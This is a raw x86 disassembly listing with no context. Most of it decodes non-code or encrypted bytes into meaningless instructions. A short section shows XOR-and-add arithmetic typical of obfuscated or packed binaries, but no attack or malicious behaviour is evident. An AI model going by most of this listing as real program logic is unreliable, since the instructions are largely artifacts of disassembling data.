  41af22:	nop
  41af23:	shl    BYTE PTR [edx],cl
  41af25:	mov    ah,0xef
  41af27:	lods   al,BYTE PTR ds:[esi]
  41af28:	loopne 0x41af10
  41af2a:	adc    bl,BYTE PTR [esi+0x6469275]
  41af30:	push   ebx
  41af31:	(bad)  
  41af32:	repz sbb dl,bl
  41af35:	int    0x21
  41af37:	pop    ss
  41af38:	or     eax,0xb270dc6b
  41af3d:	rcl    DWORD PTR [ebx],1
  41af3f:	stos   BYTE PTR es:[edi],al
  41af40:	and    BYTE PTR [ecx],0x80
  41af43:	ss fwait
  41af45:	mov    cl,BYTE PTR [edi]
  41af47:	xchg   esp,eax
  41af48:	or     bl,BYTE PTR [esi-0x75fb61fb]
  41af4e:	and    al,0x4d
  41af50:	mov    ch,0x49
  41af52:	sahf   
  41af53:	ficom  DWORD PTR [edx]
  41af55:	cmp    ebx,edi
  41af57:	sbb    ecx,eax
  41af59:	enter  0xf73e,0x70
  41af5d:	mov    WORD PTR [eax-0x32],es
  41af60:	add    eax,0x7a04f93a
  41af65:	adc    al,0xa1
  41af67:	ror    DWORD PTR [ecx],0x27
  41af6a:	and    al,0xc3
  41af6c:	pop    edx
  41af6d:	mov    cl,0x80
  41af6f:	push   ebx
  41af70:	pop    DWORD PTR [eax]
  41af72:	in     al,dx
  41af73:	ja     0x41afa4
  41af75:	cmc    
  41af76:	mov    WORD PTR fs:[eax+0x56e51dd9],?
  41af7d:	loopne 0x41af4e
  41af7f:	jecxz  0x41af3c
  41af81:	adc    DWORD PTR [ebp+0x47f00684],edi
  41af87:	(bad)  
  41af88:	mov    ecx,0x78b45138
  41af8d:	xor    DWORD PTR [ebx],esi
  41af8f:	xchg   esp,eax
  41af90:	lods   al,BYTE PTR ds:[esi]
  41af91:	std    
  41af92:	sbb    DWORD PTR [ecx-0x6e977dc],0x31
  41af99:	mov    BYTE PTR [eax-0x2861143e],ch
  41af9f:	mov    dl,0x55
  41afa1:	(bad)  
  41afa2:	jg     0x41af65
  41afa4:	mov    ds:0xe8d2157b,al
  41afa9:	(bad)  
  41afaa:	hlt    
  41afab:	stos   BYTE PTR es:[edi],al
  41afac:	xchg   ebx,ecx
  41afae:	jmp    0x41b1e3
  41afb3:	(bad)
  41afb6:	int    0xd4
  41afb8:	int    0xd9
  41afba:	fnstcw WORD PTR [edi+0x40181003]
  41afc0:	xchg   esp,eax
  41afc1:	adc    BYTE PTR [ebx+0x787fde10],dh
  41afc7:	adc    BYTE PTR [esi+0x78],bh
  41afca:	js     0x41af74
  41afcc:	sub    bl,dl
  41afce:	jo     0x41afc6
  41afd0:	xchg   esp,esi
  41afd2:	repnz std 
  41afd4:	mov    bh,0x21
  41afd6:	loopne 0x41afc4
  41afd8:	fld    TBYTE PTR [ecx]
  41afda:	inc    ebx
  41afdb:	and    al,0xac
  41afdd:	inc    edx
  41afde:	nop
  41afdf:	int3   
  41afe0:	mov    BYTE PTR [eax+0x543af408],dh
  41afe6:	fbstp  TBYTE PTR [edi+eax*8+0x32]
  41afea:	cmc    
  41afeb:	adc    ecx,edx
  41afed:	arpl   bx,si
  41afef:	xchg   edx,eax
  41aff0:	mov    bl,0xf
  41aff2:	cmp    bl,BYTE PTR [edi+0x76551675]
  41aff8:	fnstenv [esi-0x77]
  41affb:	popw   ss
  41affd:	pusha  
  41affe:	inc    esp
  41afff:	xor    eax,0x6e486586
  41b004:	or     bh,BYTE PTR [eax]
  41b006:	jo     0x41b04c
  41b008:	sbb    ecx,DWORD PTR [esi]
  41b00a:	ss test ecx,esi
  41b00d:	call   0xc7a1d894
  41b012:	cmp    ah,BYTE PTR [eax+0x6b]
  41b015:	cmp    BYTE PTR [edx-0x1a750f95],cl
  41b01b:	adc    ch,BYTE PTR [ecx+0x27]
  41b01e:	mov    esi,0x53285bef
  41b024:	push   0x7eff12bb
  41b029:	shl    DWORD PTR [edi+0x52c965e1],1
  41b02f:	(bad)  
  41b030:	adc    eax,0xdaa62b8e
  41b035:	jecxz  0x41b067
  41b037:	push   0xffffffb1
  41b039:	js     0x41b0a4
  41b03b:	ror    BYTE PTR [ebx*2-0x1b9efe30],1
  41b042:	aaa    
  41b043:	jbe    0x41afe5
  41b045:	js     0x41b05c
  41b047:	add    al,BYTE PTR [edi+0x1a]
  41b04a:	rcr    ebx,1
  41b04c:	adc    DWORD PTR [edx-0x7d],edx
  41b04f:	jp     0x41b0b1
  41b051:	into   
  41b052:	lods   eax,DWORD PTR ds:[esi]
  41b053:	inc    ebx
  41b054:	(bad)  [ebx]
  41b056:	inc    ecx
  41b057:	inc    eax
  41b058:	loope  0x41b043
  41b05a:	sub    al,0x2a
  41b05c:	push   ebx
  41b05d:	in     eax,0x3c
  41b05f:	ret    
  41b060:	out    0x12,eax
  41b062:	arpl   sp,bx
  41b064:	xor    dh,BYTE PTR [ecx-0x3cc00db]
  41b06a:	and    esi,edx
  41b06c:	ret    0x78c4
  41b06f:	or     BYTE PTR [edi+0x77],bl
  41b072:	mov    DWORD PTR [esi+0x38],esp
  41b075:	shr    BYTE PTR [edx-0x1f],1
  41b078:	push   edi
  41b079:	pop    eax
  41b07a:	dec    ecx
  41b07b:	in     eax,dx
  41b07c:	gs xchg edi,eax
  41b07e:	clc    
  41b07f:	mov    eax,0x69743d7b
  41b084:	ficom  DWORD PTR [eax]
  41b086:	test   DWORD PTR [eax+0x4ad838a9],ebx
  41b08c:	lods   eax,DWORD PTR ds:[esi]
  41b08d:	inc    esp
  41b08e:	cld    
  41b08f:	cmp    eax,0x8ed1c7a2
  41b094:	push   ds
  41b095:	test   BYTE PTR [ebx],bh
  41b097:	(bad)  
  41b098:	dec    ecx
  41b099:	fnstcw WORD PTR [edi]
  41b09b:	in     eax,0x83
  41b09d:	int    0x83
  41b09f:	or     al,0xbd
  41b0a1:	mov    ds:0x51faa657,eax
  41b0a6:	dec    ecx
  41b0a7:	cdq    
  41b0a8:	or     BYTE PTR [edi+0x63],cl
  41b0ab:	xchg   BYTE PTR [ebp+0x7f],dl
  41b0ae:	loope  0x41b042
  41b0b0:	push   ebx
  41b0b1:	int3   
  41b0b2:	arpl   WORD PTR [ebp-0x90a17f1],bx
  41b0b8:	test   eax,0xc31f7257
  41b0bd:	cmp    ah,ah
  41b0bf:	xchg   esp,eax
  41b0c0:	out    0x91,eax
  41b0c2:	xchg   ebp,eax
  41b0c3:	mov    ds:0x1609a8aa,al
  41b0c8:	and    DWORD PTR [ebp+0x50],esp
  41b0cb:	sub    eax,0x40aaf517
  41b0d0:	mov    dl,0x6
  41b0d2:	fimul  WORD PTR [ecx-0x55]
  41b0d5:	dec    edx
  41b0d6:	jg     0x41b149
  41b0d8:	mov    eax,0x174ad8dc
  41b0dd:	(bad)  
  41b0de:	clc    
  41b0df:	stc    
  41b0e0:	inc    esi
  41b0e1:	and    edx,DWORD PTR [ecx]
  41b0e3:	sti    
  41b0e4:	addr16 enter 0x984a,0xc4
  41b0e9:	xchg   edx,eax
  41b0ea:	mov    ds:0x53fa24e3,eax
  41b0ef:	ret    0x7c3e
  41b0f2:	xlat   BYTE PTR ds:[ebx]
  41b0f3:	push   0xffffff81
  41b0f5:	dec    ebx
  41b0f6:	hlt    
  41b0f7:	sti    
  41b0f8:	(bad)  
  41b0f9:	jnp    0x41b16c
  41b0fb:	jge    0x41b0c8
  41b0fd:	push   esp
  41b0fe:	out    dx,al
  41b0ff:	xchg   ecx,eax
  41b100:	int    0x97
  41b102:	(bad)  
  41b103:	xor    BYTE PTR [ebx+0x57],cl
  41b106:	dec    ebx
  41b107:	lahf   
  41b108:	mov    ebx,0x32e08285
  41b10d:	jns    0x41b188
  41b10f:	(bad)  
  41b112:	ror    BYTE PTR [edi+0x559fe0fe],1
  41b118:	outs   dx,DWORD PTR ds:[esi]
  41b119:	push   eax
  41b11a:	dec    ebp
  41b11b:	dec    ecx
  41b11c:	lods   eax,DWORD PTR ss:[esi]
  41b11e:	adc    BYTE PTR [esi+0x58],dh
  41b121:	stc    
  41b122:	cmp    BYTE PTR [edx+esi*2],bh
  41b125:	ins    BYTE PTR es:[edi],dx
  41b126:	(bad)  
  41b127:	cmp    BYTE PTR ds:0x5f9fb2a3,bh
  41b12d:	inc    ebx
  41b12e:	push   eax
  41b12f:	shl    DWORD PTR [edi],1
  41b131:	lds    esp,FWORD PTR [ebx-0x2e794fb6]
  41b137:	int    0xe0
  41b139:	add    cl,BYTE PTR [ebp+0x3fa079e]
  41b13f:	fcomp  QWORD PTR [ebx]
  41b141:	adc    esp,eax
  41b143:	mov    ebx,0xdf515f52
  41b148:	outs   dx,DWORD PTR ds:[esi]
  41b149:	dec    ebx
  41b14a:	lock in al,0xc4
  41b14d:	add    DWORD PTR [esi-0x1d621bd],edx
  41b153:	mov    esi,0xe6acfa00
  41b158:	cmp    al,0x33
  41b15a:	mov    DWORD PTR [ebp*2+0x4d7f2813],ecx
  41b161:	aaa    
  41b162:	push   ds
  41b163:	retf   0xec4f
  41b166:	jmp    0x745:0xfffef72a
  41b16d:	fpatan 
  41b16f:	cmp    al,0x6b
  41b171:	js     0x41b196
  41b173:	xor    DWORD PTR [edi+0x26],edi
  41b176:	mov    ebx,0xcd7db23b
  41b17b:	enter  0x83a8,0x61
  41b17f:	mov    esi,DWORD PTR [edi-0x21]
  41b182:	mov    ebp,0xeee2f41
  41b187:	pop    edi
  41b188:	cld    
  41b189:	fnstsw WORD PTR [ecx+esi*1-0x7d]
  41b18d:	pop    ecx
  41b18e:	repnz retf 0xa251
  41b192:	jl     0x41b1ab
  41b194:	aaa    
  41b195:	lods   al,BYTE PTR ds:[esi]
  41b196:	js     0x41b193
  41b198:	xor    al,0x1e
  41b19a:	or     al,0x7c
  41b19c:	xor    BYTE PTR [edi],dl
  41b19e:	in     eax,0xb2
  41b1a0:	xor    al,0xf1
  41b1a2:	xor    eax,0xcc3889ee
  41b1a7:	pop    ss
  41b1a8:	adc    BYTE PTR [esi-0xb3110c6],al
  41b1ae:	cmp    DWORD PTR [ebp*1-0x49880a95],ebx
  41b1b5:	retf   
  41b1b6:	les    eax,FWORD PTR [esi]
  41b1b8:	add    BYTE PTR [eax-0x1e],al
  41b1bb:	sub    BYTE PTR [esp+edi*2],bl
  41b1be:	paddd  mm2,QWORD PTR [eax+0x483c1c27]
  41b1c5:	sbb    BYTE PTR [ebx-0x46f584f2],ah
  41b1cb:	cmp    dl,bl
  41b1cd:	cmp    DWORD PTR [ecx+0x20],esi
  41b1d0:	cmp    edi,DWORD PTR [ecx-0x1cc92848]
  41b1d6:	dec    ebp
  41b1d7:	cld    
  41b1d8:	pop    eax
  41b1d9:	(bad)  
  41b1db:	xor    dh,ah
  41b1dd:	pop    ds
  41b1de:	lods   eax,DWORD PTR ds:[esi]
  41b1df:	int    0xc8
  41b1e1:	ins    DWORD PTR es:[edi],dx
  41b1e2:	jbe    0x41b22d
  41b1e4:	mov    eax,DWORD PTR [ebp-0x1c]
  41b1e7:	jmp    0x41b41c
  41b1ec:	iret   
  41b1ed:	enter  0xd0d3,0xd3
  41b1f1:	fcmovnu st,st(3)
  41b1f3:	xlat   BYTE PTR ds:[ebx]
  41b1f4:	push   esp
  41b1f5:	shr    BYTE PTR ss:[si-0xe],0xfc
  41b1fb:	out    dx,eax
  41b1fc:	sub    ah,bl
  41b1fe:	jg     0x41b278
  41b200:	adc    BYTE PTR [esi+0x78],bh
  41b203:	js     0x41b248
  41b205:	jl     0x41b25a
  41b207:	sbb    edi,esp
  41b209:	ss aas 
  41b20b:	(bad)  
  41b20c:	cld    
  41b20d:	neg    BYTE PTR [eax-0x127f3abe]
  41b213:	jmp    0x7e9b:0x9385f50a
  41b21a:	fmul   DWORD PTR [ecx-0xa]
  41b21d:	retfw  
  41b21f:	add    eax,0xa95f24d
  41b224:	ret    
  41b225:	call   0x3c04:0xd6969469
  41b22c:	es sahf 
  41b22e:	xor    al,ch
  41b230:	sbb    DWORD PTR [edi+0x7b],0xc0a06ac
  41b237:	(bad)  
  41b238:	das    
  41b239:	les    ebx,FWORD PTR [edi-0x1f]
  41b23c:	and    ebp,DWORD PTR ds:0xf934277d
  41b242:	mov    ds:0xe01023c4,eax
  41b247:	xlat   BYTE PTR ds:[ebx]
  41b248:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b249:	fdivr  QWORD PTR [ebx]
  41b24b:	(bad)  
  41b24c:	out    0xda,al
  41b24e:	into   
  41b24f:	xor    dl,0x5a
  41b252:	inc    ebx
  41b253:	addr16 mov eax,0xbef41dad
  41b259:	push   edx
  41b25a:	pop    ds
  41b25b:	ficom  WORD PTR [edx]
  41b25d:	(bad)  
  41b25e:	xor    eax,0xef292ad4
  41b263:	(bad)  
  41b264:	pop    esp
  41b265:	stos   DWORD PTR es:[edi],eax
  41b266:	jle    0x41b2c5
  41b268:	in     al,0xb6
  41b26a:	(bad)
  41b26e:	lods   al,BYTE PTR ds:[esi]
  41b26f:	(bad)  
  41b270:	outs   dx,DWORD PTR ds:[esi]
  41b271:	inc    ecx
  41b272:	mov    bh,0xfb
  41b274:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b275:	push   esi
  41b276:	push   ds
  41b277:	dec    ebp
  41b278:	sub    dl,dh
  41b27a:	pop    es
  41b27b:	push   esp
  41b27c:	mov    al,ds:0x528f8a1d
  41b281:	push   0x8e5246b4
  41b286:	mov    ds:0x3ef033ff,al
  41b28b:	hlt    
  41b28c:	arpl   WORD PTR [edi],di
  41b28e:	retf   0xc722
  41b291:	outs   dx,DWORD PTR ds:[esi]
  41b292:	popa   
  41b293:	fild   DWORD PTR [eax+0x3335a6c4]
  41b299:	pop    esi
  41b29a:	pop    esp
  41b29b:	ror    eax,cl
  41b29d:	xchg   BYTE PTR [esi+0x29b53dd6],dh
  41b2a3:	add    bh,bl
  41b2a5:	das    
  41b2a6:	scas   eax,DWORD PTR es:[edi]
  41b2a7:	lods   eax,DWORD PTR ds:[esi]
  41b2a8:	jmpw   0x1edf
  41b2ac:	jmp    0x41b26d
  41b2ae:	adc    ebx,DWORD PTR [ebp+eiz*4+0x69]
  41b2b2:	pop    ds
  41b2b3:	fdivr  QWORD PTR [edi+0x2e]
  41b2b6:	mov    cl,0x5b
  41b2b8:	dec    esp
  41b2b9:	inc    esi
  41b2ba:	mov    al,ds:0x89661204
  41b2bf:	mov    ebp,0x524dce17
  41b2c4:	sub    BYTE PTR [edi+0x17353d3d],0x9c
  41b2cb:	stos   DWORD PTR es:[edi],eax
  41b2cc:	in     eax,dx
  41b2cd:	mov    al,0xbe
  41b2cf:	xor    al,0xf5
  41b2d1:	aad    0xf5
  41b2d3:	adc    edi,DWORD PTR ds:0xabe1f2f8
  41b2d9:	loope  0x41b28a
  41b2db:	fst    DWORD PTR [esi+0x41aed1d6]
  41b2e1:	xchg   esp,eax
  41b2e2:	std    
  41b2e3:	push   esi
  41b2e4:	mov    edx,0xd10a9a88
  41b2e9:	add    DWORD PTR [esi+0x1],esi
  41b2ec:	sub    WORD PTR ds:[edi+0x5c559cfa],dx
  41b2f4:	jne    0x41b2b4
  41b2f6:	push   cs
  41b2f7:	cmp    DWORD PTR [ecx],esp
  41b2f9:	cwde   
  41b2fa:	lahf   
  41b2fb:	les    esi,FWORD PTR [ebx+0x3c]
  41b2fe:	ins    DWORD PTR es:[edi],dx
  41b2ff:	adc    al,0xcd
  41b301:	in     eax,dx
  41b302:	xor    al,0x53
  41b304:	mov    ds:0x1b29c366,eax
  41b309:	sub    BYTE PTR [edi+0x2a3b1434],dh
  41b30f:	fwait
  41b310:	out    dx,al
  41b311:	stos   DWORD PTR es:[edi],eax
  41b312:	xor    BYTE PTR [esi+esi*2],cl
  41b315:	jne    0x41b2ab
  41b317:	jmp    0x41b2bd
  41b319:	mov    eax,0xd61d51d5
  41b31e:	sahf   
  41b31f:	popf   
  41b320:	fild   WORD PTR [eax-0x4]
  41b323:	gs xor dl,bl
  41b326:	inc    eax
  41b327:	hlt    
  41b328:	inc    edx
  41b329:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  41b32b:	pop    edi
  41b32c:	cli    
  41b32d:	pop    esp
  41b32e:	(bad)  
  41b32f:	js     0x41b30c
  41b331:	lea    esp,[eax+0x25def739]
  41b337:	in     al,dx
  41b338:	loop   0x41b34d
  41b33a:	or     BYTE PTR [ebp+0x28],dh
  41b33d:	mov    ecx,0xd2745721
  41b342:	push   esp
  41b343:	push   ds
  41b344:	push   eax
  41b345:	push   ecx
  41b346:	or     DWORD PTR [eax+0x191de007],ecx
  41b34c:	sbb    al,0xc3
  41b34e:	mov    ecx,ds
  41b350:	ret    0xfb6c
  41b353:	jae    0x41b2ea
  41b355:	adc    BYTE PTR [ecx],ah
  41b357:	xchg   ebx,eax
  41b358:	dec    esp
  41b359:	dec    ebx
  41b35a:	jg     0x41b33b
  41b35c:	mul    DWORD PTR [ebx+0x11]
  41b35f:	(bad)  
  41b360:	xchg   edx,eax
  41b361:	push   0x738b442f
  41b366:	xchg   dh,dl
  41b368:	ins    BYTE PTR es:[edi],dx
  41b369:	lea    ebx,[esi+0x3cbca6e8]
  41b36f:	ins    BYTE PTR es:[edi],dx
  41b370:	repz test BYTE PTR [ebp+0x7ce894c5],cl
  41b377:	sub    al,0x42
  41b379:	sbb    ebp,ecx
  41b37b:	add    bl,ch
  41b37d:	out    0x51,al
  41b37f:	mov    bh,0x74
  41b381:	and    DWORD PTR [eax-0x696d12e8],esp
  41b387:	pop    ss
  41b388:	dec    ecx
  41b389:	add    DWORD PTR [ebx+0x72],esi
  41b38c:	sub    DWORD PTR [edx+0x22],esp
  41b38f:	mov    ebx,0x6971e1c0
  41b394:	jecxz  0x41b368
  41b396:	mov    bl,BYTE PTR [ecx]
  41b398:	sbb    BYTE PTR [ebx],bl
  41b39a:	cmp    DWORD PTR [ebp-0x27],ecx
  41b39d:	mov    DWORD PTR [ecx],esi
  41b39f:	inc    esi
  41b3a0:	out    dx,al
  41b3a1:	fcomp  DWORD PTR [ecx]
  41b3a3:	mov    edi,0xa6cb8f0b
  41b3a8:	cmp    al,0x5b
  41b3aa:	lock push ebp
  41b3ac:	(bad)
  41b3af:	push   ebx
  41b3b0:	in     al,0xc9
  41b3b2:	xchg   edi,eax
  41b3b3:	ja     0x41b386
  41b3b5:	repz imul BYTE PTR fs:[eax]
  41b3b9:	lods   eax,DWORD PTR ds:[esi]
  41b3ba:	je     0x41b3f3
  41b3bc:	out    dx,eax
  41b3bd:	sub    DWORD PTR [edx+0x49144305],edi
  41b3c3:	add    BYTE PTR [edi-0x6a9a5f42],ah
  41b3c9:	mov    dl,0x15
  41b3cb:	ja     0x41b43e
  41b3cd:	das    
  41b3ce:	lods   al,BYTE PTR ds:[esi]
  41b3cf:	adc    edx,0x9a2e0355
  41b3d5:	lahf   
  41b3d6:	jno    0x41b387
  41b3d8:	pop    ebp
  41b3d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b3da:	or     BYTE PTR [ecx+0x21],0xb5
  41b3de:	push   es
  41b3df:	call   0xd7d5a9fb
  41b3e4:	jbe    0x41b3c9
  41b3e6:	sub    esp,DWORD PTR [ebx+0x3f]
  41b3e9:	jecxz  0x41b374
  41b3eb:	into   
  41b3ec:	bound  esi,QWORD PTR [esi+0x64ad8b28]
  41b3f2:	and    dl,BYTE PTR [ebx+0x1f]
  41b3f5:	adc    BYTE PTR [ebx+0x2e73d8a5],bl
  41b3fb:	dec    ebp
  41b3fc:	pop    ss
  41b3fd:	pop    edi
  41b3fe:	fst    QWORD PTR [ebp-0x34f5b222]
  41b404:	mov    ch,0x5c
  41b406:	inc    DWORD PTR [edx]
  41b408:	mov    ds:0x309a4326,eax
  41b40d:	shr    DWORD PTR [ebx+0x1a],1
  41b410:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b411:	dec    dx
  41b413:	or     cl,cl
  41b415:	lahf   
  41b416:	xchg   edx,eax
  41b417:	add    edi,DWORD PTR [edi+eiz*2+0x67]
  41b41b:	sub    ecx,DWORD PTR [edi]
  41b41d:	scas   eax,DWORD PTR es:[edi]
  41b41e:	shr    DWORD PTR [ebx],0xe0
  41b421:	mov    DWORD PTR [ebp-0x24],esp
  41b424:	mov    eax,DWORD PTR [ebp-0x4]
  41b427:	mov    ecx,0x7510850
  41b42c:	xor    eax,ecx
  41b42e:	mov    edx,0x327298
  41b433:	add    eax,edx
  41b435:	mov    DWORD PTR [ebp+0x8],eax
  41b438:	mov    eax,DWORD PTR [ebp-0x18]
  41b43b:	xor    eax,ecx
  41b43d:	add    eax,edx
  41b43f:	mov    edx,DWORD PTR [ebp+0x14]
  41b442:	imul   eax,DWORD PTR [edx]
  41b445:	mov    edx,DWORD PTR [ebp-0x4]
  41b448:	xor    edx,ecx
  41b44a:	mov    ecx,DWORD PTR [ebp+0x8]
  41b44d:	lea    ecx,[edx+ecx*1+0x327298]
  41b454:	cmp    ecx,eax
  41b456:	je     0x41bfd6
  41b45c:	mov    edi,DWORD PTR [ebp-0x18]
  41b45f:	mov    eax,DWORD PTR [ebp+0x8]
  41b462:	mov    edx,DWORD PTR [ebp+0x14]
  41b465:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  41b469:	mov    ecx,0x7510850
  41b46e:	xor    edx,edx
  41b470:	xor    edi,ecx
  41b472:	mov    esi,0x327298
  41b477:	add    edi,esi
  41b479:	div    edi
  41b47b:	mov    edx,DWORD PTR [ebp-0x4]
  41b47e:	xor    edx,ecx
  41b480:	lea    eax,[edx+eax*1+0x327298]
  41b487:	mov    edx,DWORD PTR [ebp+0x8]
  41b48a:	mov    edi,DWORD PTR [ebp-0x24]
  41b48d:	mov    DWORD PTR [edi+edx*4],eax
  41b490:	mov    eax,DWORD PTR [ebp-0x18]
  41b493:	mov    edx,DWORD PTR [ebp+0x8]
  41b496:	xor    eax,ecx
  41b498:	lea    eax,[eax+edx*1+0x327298]
  41b49f:	mov    DWORD PTR [ebp+0x8],eax
  41b4a2:	mov    eax,DWORD PTR [ebp-0x18]
  41b4a5:	mov    edx,DWORD PTR [ebp+0x14]
  41b4a8:	jmp    0x41b6dd
  41b4ad:	int3   
  41b4ae:	(bad)  
  41b4af:	retf   0xd9d6
  41b4b2:	fxch   st(4)
  41b4b4:	leave  
  41b4b5:	mov    ch,0xbb
  41b4b7:	push   ds
  41b4b8:	hlt    
  41b4b9:	pop    edi
  41b4ba:	lahf   
  41b4bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b4bc:	xor    eax,eax
  41b4be:	loop   0x41b53f
  41b4c0:	js     0x41b4d2
  41b4c2:	jle    0x41b53c
  41b4c4:	js     0x41b4bf
  41b4c6:	xor    ah,dh
  41b4c8:	lock mov cl,0xf6
  41b4cb:	cmc    
  41b4cc:	xchg   edi,eax
  41b4cd:	(bad)  
  41b4ce:	(bad)  [eax]
  41b4d0:	imul   edx,DWORD PTR [ecx-0x51],0xaf4673af
  41b4d7:	ins    DWORD PTR es:[edi],dx
  41b4d8:	push   es
  41b4d9:	pop    es
  41b4da:	cmp    edx,DWORD PTR [edi-0x305dc499]
  41b4e0:	jns    0x41b51e
  41b4e2:	nop
  41b4e3:	mov    esi,0x84e5dc9f
  41b4e8:	or     esi,ecx
  41b4ea:	retf   0x97f8
  41b4ed:	mov    ah,0x7c
  41b4ef:	sub    eax,edx
  41b4f1:	mov    dh,0xa1
  41b4f3:	jg     0x41b4bc
  41b4f5:	rcr    BYTE PTR [eax],1
  41b4f7:	and    DWORD PTR [edx],esp
  41b4f9:	adc    bh,BYTE PTR [eax+ebx*2+0x8]
  41b4fd:	shl    DWORD PTR [eax-0x30],0x13
  41b501:	cmp    DWORD PTR [edi+eax*8+0x69229819],edx
  41b508:	test   BYTE PTR ds:[edi+0x55],cl
  41b50c:	fs cmc 
  41b50e:	inc    ecx
  41b50f:	pop    eax
  41b510:	push   es
  41b511:	lds    eax,FWORD PTR [edx-0x24ab342f]
  41b517:	dec    eax
  41b518:	lea    ebx,[edx]
  41b51a:	push   ss
  41b51b:	popf   
  41b51c:	sbb    DWORD PTR [eax],edi
  41b51e:	stos   BYTE PTR es:[edi],al
  41b51f:	jb     0x41b52d
  41b521:	je     0x41b4ba
  41b523:	(bad)  
  41b524:	push   ss
  41b525:	sub    DWORD PTR [eax-0x62],edx
  41b528:	push   eax
  41b529:	lods   eax,DWORD PTR ds:[esi]
  41b52a:	std    
  41b52b:	push   cs
  41b52c:	xor    al,0x21
  41b52e:	mov    esp,0xc82025f4
  41b533:	sbb    BYTE PTR [ecx+esi*1-0x28d8e081],dh
  41b53a:	sbb    DWORD PTR [esi],eax
  41b53c:	test   al,0xbd
  41b53e:	repz pushf 
  41b540:	js     0x41b4d2
  41b542:	or     DWORD PTR [ecx-0x5f036015],0x23d4a51f
  41b54c:	les    edx,FWORD PTR [eax-0x7d]
  41b54f:	mov    dh,BYTE PTR [ebx+0x2e]
  41b552:	mov    DWORD PTR [ebx],edx
  41b554:	es cmp al,0x33
  41b557:	inc    ebp
  41b558:	sbb    dl,BYTE PTR [eax]
  41b55a:	pop    edx
  41b55b:	mov    DWORD PTR [esi-0x6922b796],ecx
  41b561:	outs   dx,BYTE PTR ds:[esi]
  41b562:	or     esi,DWORD PTR [edx-0x23]
  41b565:	lds    edx,FWORD PTR [eax+0x2177755e]
  41b56b:	mov    ah,0x8d
  41b56d:	push   cs
  41b56e:	icebp  
  41b56f:	or     eax,0x26087228
  41b574:	dec    eax
  41b575:	push   ebx
  41b576:	cmp    ebp,DWORD PTR [edx-0x87b1af4]
  41b57c:	(bad)  
  41b57d:	div    al
  41b57f:	jne    0x41b5e5
  41b581:	int    0x2a
  41b583:	cmp    edx,eax
  41b585:	adc    BYTE PTR [eax-0x7aa94583],dh
  41b58b:	out    0x61,al
  41b58d:	pusha  
  41b58e:	pop    ds
  41b58f:	mov    fs,WORD PTR ds:0x571aad21
  41b595:	ins    BYTE PTR es:[edi],dx
  41b596:	in     eax,0xdd
  41b598:	daa    
  41b599:	in     eax,0xb7
  41b59b:	call   FWORD PTR [esp+eax*1-0x486f0193]
  41b5a2:	sbb    BYTE PTR [edx],ch
  41b5a4:	dec    ebx
  41b5a5:	pop    es
  41b5a6:	dec    ebp
  41b5a7:	push   ss
  41b5a8:	mov    eax,0xf1c353da
  41b5ad:	arpl   WORD PTR [edx-0x19fafa87],ax
  41b5b3:	popf   
  41b5b4:	cld    
  41b5b5:	xchg   ebp,eax
  41b5b6:	push   ebx
  41b5b7:	or     esi,eax
  41b5b9:	mov    bh,0xde
  41b5bb:	fild   WORD PTR [ecx]
  41b5bd:	pop    eax
  41b5be:	xchg   edx,esi
  41b5c0:	adc    al,0x6e
  41b5c2:	dec    esp
  41b5c3:	mov    fs,WORD PTR [edx]
  41b5c5:	mov    al,0x42
  41b5c7:	ror    BYTE PTR [ebx+0x3c3d33d0],1
  41b5cd:	push   ebp
  41b5ce:	add    eax,0xd65260d7
  41b5d3:	cmp    DWORD PTR [ecx],edi
  41b5d5:	push   cs
  41b5d6:	out    0x94,al
  41b5d8:	cmc    
  41b5d9:	xchg   esi,eax
  41b5da:	fstp   TBYTE PTR [ecx]
  41b5dc:	sbb    eax,0x8885e6f2
  41b5e1:	add    BYTE PTR [ebp+0x65153b94],ah
  41b5e7:	ds clc 
  41b5e9:	cmp    ch,BYTE PTR [eax]
  41b5eb:	std    
  41b5ec:	jp     0x41b636
  41b5ee:	and    al,0x67
  41b5f0:	jg     0x41b5da
  41b5f2:	mov    eax,eax
  41b5f4:	popa   
  41b5f5:	add    dl,bh
  41b5f7:	push   ds
  41b5f8:	mov    BYTE PTR [edi-0x53],cl
  41b5fb:	adc    bl,bl
  41b5fd:	jg     0x41b656
  41b5ff:	fiadd  DWORD PTR [edi+edi*1]
  41b602:	lahf   
  41b603:	rcl    DWORD PTR [edi-0x41],1
  41b606:	addr16 ss loopne 0x41b662
  41b60a:	sbb    BYTE PTR [ebx+0x6e],cl
  41b60d:	push   edx
  41b60e:	push   ebx
  41b60f:	loop   0x41b5d7
  41b611:	mov    dl,0xaa
  41b613:	(bad)  
  41b614:	into   
  41b615:	mov    edx,0x9cc164ec
  41b61a:	enter  0x2b0a,0x38
  41b61e:	mov    DWORD PTR [ebx-0x75d6ca80],ecx
  41b624:	sub    ch,BYTE PTR [ebp+edi*4+0x79]
  41b628:	cs or  eax,0x87874f5a
  41b62e:	call   0xd366:0xc2cdb8c4
  41b635:	lods   eax,DWORD PTR ds:[esi]
  41b636:	popa   
  41b637:	jg     0x41b678
  41b639:	and    eax,0xf163dd2b
  41b63e:	mov    ds:0xbd52ee5d,al
  41b643:	ss sbb eax,0x3e1b2ce9
  41b649:	mov    al,ds:0x9e2d549b
  41b64e:	xor    al,0xcf
  41b650:	es and al,0xdb
  41b653:	in     eax,dx
  41b654:	push   edi
  41b655:	gs icebp 
  41b657:	retf   
  41b658:	mov    eax,ds:0x69d651bc
  41b65d:	dec    ecx
  41b65e:	xor    al,0xdd
  41b660:	mov    ch,0x3d
  41b662:	pusha  
  41b663:	jl     0x41b697
  41b665:	retf   
  41b666:	inc    ecx
  41b667:	pop    esp
  41b668:	mov    dh,0x4c
  41b66a:	add    al,0x70
  41b66c:	sbb    eax,0x41dfa48d
  41b671:	les    ebx,FWORD PTR fs:[ecx+0x212c1eb7]
  41b678:	sub    al,0xd1
  41b67a:	popa   
  41b67b:	je     0x41b6ce
  41b67d:	mov    eax,ds:0x1d51a18
  41b682:	sub    DWORD PTR [esi],ebx
  41b684:	and    cl,BYTE PTR [eax+0x62b98023]
  41b68a:	and    ah,bl
  41b68c:	dec    esp
  41b68d:	mov    edx,0x70af42c3
  41b692:	sub    al,0xa7
  41b694:	sar    DWORD PTR [ebx+0x50],0x10
